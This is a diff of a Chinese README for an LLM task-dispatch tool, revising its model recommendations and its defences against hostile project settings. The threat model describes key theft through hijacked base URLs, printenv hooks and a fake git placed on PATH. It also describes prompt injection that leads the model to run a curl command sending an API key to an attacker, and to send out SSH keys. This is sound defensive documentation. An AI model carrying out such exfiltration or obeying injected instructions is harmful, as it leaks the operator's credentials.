@@ -121,17 +121,17 @@ node bin/agent-fleet.mjs judge --model jev --state-file state.txt --questions-fi
 
 ### 任务类型 → 推荐模型(agent-fleet 自己调研 + 真实验证后得出,会持续校准)
 
-编程与 review 优先规则见 [Codex 编程与 review](skill/references/codex-coding.md)。本机 Codex 可用时优先 GPT-6 Sol；其他任务沿用下表已有的模型分工。模型目录和账号能力可能变化，始终以真实调用和任务验收为准。
+编程与 review 优先规则见 [Codex 编程与 review](skill/references/codex-coding.md)。本机 Codex 可用时优先 GPT-6.1 Sol；其他任务沿用下表已有的模型分工。模型目录和账号能力可能变化，始终以真实调用和任务验收为准。
 
 | 任务类型 | 推荐模型 / 友好名字 | 理由 |
 |---|---|---|
-| 写代码 / 修 bug / 补测试 | 本机 Codex CLI 的 `gpt-6-sol`，默认 `medium`，简单任务 `low` | `fleet code` 在 Codex 缺失、登录失效或模型明确不支持时回退 GPT 托管别名；GLM 不作为编程默认 |
+| 写代码 / 修 bug / 补测试 | 本机 Codex CLI 的 `gpt-6.1-sol`，默认 `medium`，简单任务 `low` | `fleet code` 在 Codex 缺失、登录失效或模型明确不支持时回退 GPT 托管别名；GLM 不作为编程默认 |
 | 写作 / 翻译 / 调研 / 母语校对（写文档、写报告、核实资料） | `kollab-gateway-copy`(`gemini-3.8-flash`)或 `kollab-gateway`(默认同款) | 响应迅速、成本低，即用免第三方审批。长报告换 `gemini-3.1-pro`。**注意：实测 `gemini-3.8-flash` 做多文件代码改动容易跑满轮数零产出，绝对不要派它写代码** |
 | 批量翻译 / 格式转换 | `deepseek-v4.1-flash`(需配 `DEEPSEEK_API_KEY`)或 `kollab-gateway-bulk`(`gemini-3.5-flash-lite`,即用免配置) | 官方 Flash 档更便宜;没有 DeepSeek key 时 `kollab-gateway-bulk` 是免第三方审批的平替 |
 | 简单调研摘要 | `kimi`(需配 `MOONSHOT_API_KEY`,自带联网搜索)或 `kollab-gateway-research`(`grok-4.7`,即用免配置) | Kimi 官方端点自带联网检索能力,适合真正需要查资料的调研;不想等 key 审批时用 `kollab-gateway-research` 顶上 |
 | 高质量单次产出(长文案定稿、复杂推理) | `deepseek-v4-pro`(需配 `DEEPSEEK_API_KEY`) | DeepSeek 官方 Opus 档位映射目标,适合一次成型、不想反复返工的任务 |
 | 自动化流程里的判断/路由节点(分类、打分、二元判断、"下一步选哪个候选") | `jev`(**走 `judge` 子命令,不是 `run`**) | 结构化决策 API,不生成文本、极便宜(≈$0.042/百万 input token,output 免费)、同一输入多次调用高度稳定,没有裸 tool-call 控制 token 这类失败模式(协议本身不返回自由文本)。详见上面「JEV / `judge` 子命令」一节的实测结论表 |
-| Kimi/DeepSeek/Qwen 家族、多轮工具调用容错要求高的任务 | 不建议派给这几个家族的第三方模型,改派 `fleet code`(Codex GPT-6 Sol);失败时按全局规则停下告知用户,不静默转给 Claude | 这几个家族的模型已知存在 tool-calling 可靠性问题,有时会把裸的 tool-call 控制 token 当成普通文本吐出来而不是走结构化 `tool_use`,造成"进程正常退出但其实是假成功"——这是模型生成层面的问题,agent-fleet 的 harness 补不了,只能靠不把这类任务派给它们来规避。任何第三方模型只要某次实际输出里出现裸 tool-call 控制 token,那一次就要判定失败——不能因为路由到它就放松这条判定标准 |
+| Kimi/DeepSeek/Qwen 家族、多轮工具调用容错要求高的任务 | 不建议派给这几个家族的第三方模型,改派 `fleet code`(Codex GPT-6.1 Sol);失败时按全局规则停下告知用户,不静默转给 Claude | 这几个家族的模型已知存在 tool-calling 可靠性问题,有时会把裸的 tool-call 控制 token 当成普通文本吐出来而不是走结构化 `tool_use`,造成"进程正常退出但其实是假成功"——这是模型生成层面的问题,agent-fleet 的 harness 补不了,只能靠不把这类任务派给它们来规避。任何第三方模型只要某次实际输出里出现裸 tool-call 控制 token,那一次就要判定失败——不能因为路由到它就放松这条判定标准 |
 
 **关于 Qwen**:调研建议里提过可以考虑 Qwen,但截至本次核对(2026-09,TEST 环境
 `kollab model list`),Kollab 网关目录里**没有**收录任何 Qwen 系列模型 id,所以上面没有把 Qwen
@@ -455,7 +455,7 @@ ANTHROPIC_DEFAULT_SONNET_MODEL=<subagentModel 的值>
 | 不可信来源 | 它曾经能干什么 | 现在怎么挡的 |
 |---|---|---|
 | **继承来的宿主环境变量**(你在另一个 Claude Code 会话里嵌套跑这个工具时) | 宿主的 OAuth 登录态、宿主配的 `ANTHROPIC_CUSTOM_HEADERS`(可能是企业代理口令)会跟着请求发给你配的第三方地址 | `src/isolated-env.mjs`:每次调用前整族剥离 `ANTHROPIC_*` / `CLAUDE_*` 环境变量,再只叠回本次任务要用的那几个 |
-| **`--cwd` 指向的目标工作目录**(可能是别人发给你的项目文件夹) | 目录里自带一份 `.claude/settings.json`,用 `env.ANTHROPIC_BASE_URL` 就能把请求整个劫持到攻击者地址,**你配置在 `.env` 里的真实第三方 key 被原样送过去**;`hooks` 字段则能在会话启动时无条件执行任意命令,一条 `printenv` 就把密钥读走 | 两层:`src/project-trust.mjs` 前置闸门直接拒绝运行 + `src/run-task.mjs` 把路由钉在优先级最高的 flag 层配置里 |
+| **`--cwd` 指向的目标工作目录**(可能是别人发给你的项目文件夹) | 目录里自带一份 `.claude/settings.json`,用 `env.ANTHROPIC_BASE_URL` 就能把请求整个劫持到攻击者地址,**你配置在 `.env` 里的真实第三方 key 被原样送过去**;`hooks` 字段则能在会话启动时无条件执行任意命令,一条 `printenv` 就把密钥读走 | 默认不读取、不加载项目配置;可选白名单只加载过滤结果 + `src/run-task.mjs` 把路由钉在 flag 层配置里 |
 
 第二条尤其要注意:它**不需要**"嵌套在另一个 Claude Code 会话里"这个前提,只要你拿这个工具去处理一个
 别人给的目录就会触发,所以危害比第一条更高。而且它**不需要模型配合**——`hooks` 那条是无条件执行的,
@@ -463,33 +463,24 @@ ANTHROPIC_DEFAULT_SONNET_MODEL=<subagentModel 的值>
 
 ### 目标工作目录能做什么、不能做什么
 
-`--cwd` 指向的目录仍然可以带自己的 `CLAUDE.md`、`permissions`、`outputStyle` 等**描述性的本地行为**
-配置——那是这个工具的正常用法,决定 Agent 在这个目录里怎么干活。
+默认无需配置白名单,任何 `--cwd` 都能运行。目标目录的 `.claude/settings.json` 和
+`.claude/settings.local.json` **不读取内容、不加载**,即使含 hooks、插件、env、凭据 helper 或非法 JSON
+也不会因此拒绝运行。SDK 的 `settingSources` 固定为 `[]`,默认 `settings` 只含 fleet 自己钉死的请求配置;
+项目权限、输出风格等配置也不会生效。发现项目/祖先目录里存在这些配置文件时,只向 stderr 打一行忽略提示;
+没有文件就不打印。这个决定仍在 `resolveModel` 读密钥之前完成,不可信配置不能影响密钥解析。
 
-它**不能**做的事(命中任何一条,整次运行直接报错退出,连密钥都不会被读进内存):
+选择「忽略整个配置」而不是「拒绝运行」,就不用为每个自己的仓库维护白名单;安全保证由根本不加载来满足,
+而不是靠逐个识别越权字段。项目 hooks、插件、env、凭据 helper 都不会进入子任务;
+目标目录的 `.mcp.json` 也不自动加载(`strictMcpConfig`)。
+这不等于屏蔽所有项目文本:`CLAUDE.md` / 文件内容的 prompt injection 风险仍见下文。
 
-- **设置任何环境变量**。`env` 块里一个变量都不许有。这条一开始是按黑名单做的(挡 `ANTHROPIC_*`、
-  代理、TLS 信任根等),但独立复核实测打通了一条黑名单没覆盖的路子:在 `env.PATH` 最前面插一个
-  目录、放一个假的 `git`,Agent 干活时几乎必然会执行到它,密钥当场被读走,**不需要 prompt
-  injection**。同类变量(`BASH_ENV`、`LD_PRELOAD`、`DYLD_*`、`PYTHONPATH`、`GIT_SSH_COMMAND`…)
-  根本枚举不完,所以改成全禁——目标目录该描述的是"在这个目录里干什么活",不是"这个进程怎么跑"
-- 使用 `apiKeyHelper` / `awsAuthRefresh` / `awsCredentialExport` / `gcpAuthRefresh` /
-  `otelHeadersHelper` / `proxyAuthHelper` / `forceLoginMethod` / `policyHelper` 这类
-  "由我来决定凭据从哪来"的顶层字段(这组就是 SDK 自己归类的 credential helpers)
-- 使用 `hooks` / `statusLine` / 插件装载(`enabledPlugins` 等)——这些字段的值是**会被自动执行的
-  命令**,而子进程环境里带着你的真实密钥。实测确认:一份带 `SessionStart` hook 的项目配置,
-  `printenv ANTHROPIC_API_KEY` 就能把密钥写出来,全程不需要模型配合
-
-另外目标目录里的 `.mcp.json` 不再被自动加载(`strictMcpConfig`)——MCP server 条目同样是"会话启动时
-自动执行的命令"。
-
-选择"直接拒绝"而不是"忽略该字段继续跑":一个正经项目没有任何理由去重定向别人工具的模型流量,出现
-这种字段本身就是强信号,静默忽略等于把攻击尝试藏起来。报错信息会告诉你是哪个文件的哪个字段。
-
-代价要说清楚:**目标目录里的项目 hooks 和 `env` 块从此不会生效**。如果你自己的项目在
-`.claude/settings.json` 里写了 `hooks` 或 `env`(哪怕只是 `NODE_ENV=test` 这种无害的),用这个工具
-处理该目录时会直接报错退出。这是有意的取舍——在"目录可能来自外部"这个前提下,能执行命令、能改
-进程环境的字段没法安全放行。删掉那个字段,或者换一个工作目录。
+只有希望项目里的权限等行为配置生效时,才需要可选白名单。对自己控制的仓库,可在 agent-fleet 根目录的
+`.env` 或进程环境变量中设置 `AGENT_FLEET_TRUSTED_CWDS=/绝对路径/仓库一:/绝对路径/仓库二`（进程环境优先）。
+白名单按 realpath 后的目录边界覆盖自身及子目录,不覆盖同名前缀的兄弟目录,空值、相对路径和 `/` 均忽略。
+命中时会输出提示,并只加载过滤后的项目配置（如权限）：项目里的 `hooks`、`statusLine`、插件、`env`、凭据 helper
+与登录方式设置一律不带进子任务;白名单目录的非法 JSON 仍会报错,因为这条可选路径需要解析配置。
+请求地址、凭据和自定义头仍只取自 `models.config.json` + 操作者的 `.env`/环境变量。
+仍建议只添加自己控制的目录,不要添加第三方项目。
 
 ### 不会污染你正在用的 Claude Code
 
@@ -521,7 +512,7 @@ agent-fleet 会把 `CLAUDE_CONFIG_DIR` 指向自己专属的 `~/.agent-fleet/cla
 - `models.config.json` 本身允许提交进 git——它不含密钥,`apiKeyEnv` / `headerEnvs` 都只是变量名指针;
   如果有人不小心往里面直接写字面量 `apiKey` 或 `headers`,`src/config.mjs` 加载时会直接拒绝并报错。
 - `list-models` 只显示密钥和自定义头的状态(present/missing),从不打印它们的值。
-- 只加载目标目录自己的项目配置,不加载操作者本机的全局 `~/.claude/settings.json`。
+- 默认不加载项目/本地配置;可选白名单只加载过滤结果,始终不加载全局 `~/.claude/settings.json`。
 
 ### 还没解决的风险(不要误读上面这些防护的强度)
 
@@ -535,9 +526,8 @@ agent-fleet 会把 `CLAUDE_CONFIG_DIR` 指向自己专属的 `~/.agent-fleet/cla
   `curl 攻击者地址 -d "$ANTHROPIC_API_KEY"`;
 - 诱导模型读取并外发这台机器上的其它文件(SSH 私钥、其它项目的 `.env` 等)。
 
-另外要诚实说明:上面那张"不能做什么"的清单是**黑名单**,不是完备的白名单。Claude Code 后续版本新增
-的字段如果也能执行命令或影响出口,需要有人把它补进 `src/project-trust.mjs`。开发过程中就已经出现过
-一次这种情况——最初只盯着 `env` 块和凭据类字段,`hooks` 是后来实测才发现同样能直接读走密钥的。
+可选白名单的过滤清单仍是**黑名单**,不是完备的白名单。Claude Code 后续新增的字段如果能执行命令
+或影响出口,需要补进 `src/project-trust.mjs`。默认路径完全不加载项目配置,不依赖这张字段清单。
 
 这是 `bypassPermissions` 这个设计选择的固有代价,不是配置层能解决的问题。实务建议:
 
